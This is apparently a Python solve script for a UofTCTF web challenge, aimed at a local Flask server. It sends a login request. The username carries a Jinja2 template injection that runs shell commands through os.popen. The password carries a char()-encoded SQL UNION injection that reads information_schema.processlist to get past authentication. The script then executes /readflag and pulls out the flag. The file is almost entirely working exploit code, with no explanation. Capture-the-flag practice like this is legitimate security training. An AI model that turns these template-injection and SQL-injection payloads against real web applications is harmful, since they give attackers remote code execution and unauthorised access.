import requests
import re

BASE_URL = "http://127.0.0.1:5000"

def encode_str(s):
    return "char(" + ",".join(str(ord(c)) for c in s) + ")"

def solve():
    s = requests.Session()

    username = "{{lipsum.__globals__.os.popen(request.args.rce).read()}}\\"
    user_prefix = "username = ('"
    pass_prefix = "password = ('"
    suffix = "')"
    u_expr = (
        "substring_index("
        "substring_index(INFO,"
        + encode_str(user_prefix)
        + ",-1),"
        + encode_str(suffix)
        + ",1)"
    )
    p_expr = (
        "substring_index("
        "substring_index(INFO,"
        + encode_str(pass_prefix)
        + ",-1),"
        + encode_str(suffix)
        + ",1)"
    )
    password = (
        ") UNION SELECT "
        + u_expr
        + ", "
        + p_expr
        + " FROM information_schema.processlist WHERE ID=connection_id();-- -"
    )
    print(password)
    s.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": password
    })
    r = s.get(f"{BASE_URL}/home?rce=/readflag")
    m = re.search(r"uoftctf\{[^}]*\}", r.text)
    print(m.group(0))

if __name__ == "__main__":
    solve()
